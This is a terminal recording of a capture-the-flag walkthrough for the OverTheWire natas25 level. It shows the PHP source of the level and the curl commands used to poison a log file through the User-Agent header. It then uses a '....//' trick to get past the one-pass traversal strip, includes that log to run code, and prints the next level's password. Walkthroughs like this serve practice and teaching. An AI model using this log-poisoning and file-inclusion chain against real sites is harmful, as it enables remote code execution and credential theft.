[0.002, "o", "$ curl -s -u natas25:<pw> http://natas25.natas.labs.overthewire.org/index-source.html\r\n$   safeinclude(): strips \"../\" with str_replace, blocks natas_webpass, then include()\r\n$   logRequest(): appends  \"[date] <User-Agent> \\\"<message>\\\"\\n\"  to logs/natas25_<sid>.log\r\n"]
[0.488, "o", "function safeinclude($filename){        // check for directory traversal        if(strstr($filename,\"../\")){            logRequest(\"Directory traversal attempt! fixing request.\");            $filename=str_replace(\"../\",\"\",$filename);        }        // dont let ppl steal our passwords        if(strstr($filename,\"natas_webpass\")){            logRequest(\"Illegal file access detected! Aborting!\");            exit(-1);        }        // add more checks...        if (file_exists($filename)) {             include($filename);            return 1;        }        return 0;\r\n"]
[0.001, "o", "\r\n$   -> the log file is a PHP file inside the web root, and we control the\r\n$      User-Agent line. Two flaws chain: log poisoning + include of the log.\r\n$ 1. start a session (curl -c jar) so we know the session id:\r\n"]
[0.382, "o", "   PHPSESSID=9h17ef548pbk7dgokpcrnmqshs\r\n$ 2. send a traversal (../x) so logRequest() fires; put PHP code in the UA:\r\n"]
[0.392, "o", "   log line written: [date] <?php ... ?> \"Directory traversal attempt! fixing request.\"\r\n$ 3. include the log. \"....//\" defeats the strip: str_replace removes the\r\n$    \"../\" at offset 2, leaving \"../\" again (one pass, not recursive):\r\n$ curl -s -b jar -u natas25:<pw> --get --data-urlencode 'lang=....//logs/natas25_9h17ef548pbk7dgokpcrnmqshs.log' http://natas25.natas.labs.overthewire.org/\r\n"]
[0.382, "o", "[01.11.2026 05::02:36] string(33) \"3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT\r\n$   -> PHP executed our code inside the log file; the password is printed.\r\n$ verify: curl -u natas26:<pw> http://natas26.natas.labs.overthewire.org/ -> 200\r\n"]
